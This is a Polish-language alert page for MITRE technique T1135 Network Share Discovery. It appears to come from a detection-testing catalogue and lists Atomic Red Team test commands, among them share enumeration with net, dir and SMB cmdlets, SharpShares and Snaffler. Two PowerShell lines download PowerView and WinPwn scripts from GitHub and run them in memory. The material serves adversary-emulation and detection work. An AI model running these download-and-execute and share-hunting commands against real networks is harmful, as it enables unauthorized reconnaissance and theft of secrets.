# Alert: Network Share Discovery

Opis scenariusza, podatności lub techniki.

---

**Technika:** T1135  
**Nazwa:** Network Share Discovery  
**Taktyki:** Discovery  
**Status:** Pending  
**Autor:** Krzysztof K.  

---

<!--
Tactics: Discovery
Technique ID: T1135
Technique Name: Network Share Discovery
Status: Pending
--> 


---

## Atomic Red Team – dostępne testy dla tej techniki

### Network Share Discovery command prompt
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
net view \\#{computer_name}
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1135\Network_Share_Discovery_command_prompt/test_1.cmd)

### Network Share Discovery PowerShell
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
get-smbshare
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1135\Network_Share_Discovery_PowerShell/test_1.ps1)

### View available share drives
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
net share
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1135\View_available_share_drives/test_1.cmd)

### Share Discovery with PowerView
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1135\Share_Discovery_with_PowerView/test_1.ps1)

### PowerView ShareFinder
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
Invoke-ShareFinder #{parameters}
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1135\PowerView_ShareFinder/test_1.ps1)

### WinPwn - shareenumeration
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
shareenumeration -noninteractive -consoleoutput
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1135\WinPwn_-_shareenumeration/test_1.ps1)

### Network Share Discovery via dir command
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
dir \\#{computer_ip}\c$
dir \\#{computer_ip}\admin$
dir \\#{computer_ip}\IPC$
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1135\Network_Share_Discovery_via_dir_command/test_1.cmd)

### Enumerate All Network Shares with SharpShares
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
cmd /c '#{sharp_path}' /ldap:all | out-file -filepath "#{output_path}"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1135\Enumerate_All_Network_Shares_with_SharpS/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
remove-item "#{output_path}" -force -erroraction silentlycontinue
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1135\Enumerate_All_Network_Shares_with_SharpS/cleanup_1.ps1)

### Enumerate All Network Shares with Snaffler
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
invoke-expression 'cmd /c start powershell -command { cmd /c "#{snaffler_path}" -a -o "#{output_path}" }; start-sleep 90; stop-process -name "snaffler"'
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1135\Enumerate_All_Network_Shares_with_Snaffl/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
remove-item "#{output_path}" -force -erroraction silentlycontinue
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1135\Enumerate_All_Network_Shares_with_Snaffl/cleanup_1.ps1)

[Zobacz testy na GitHubie](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1135)
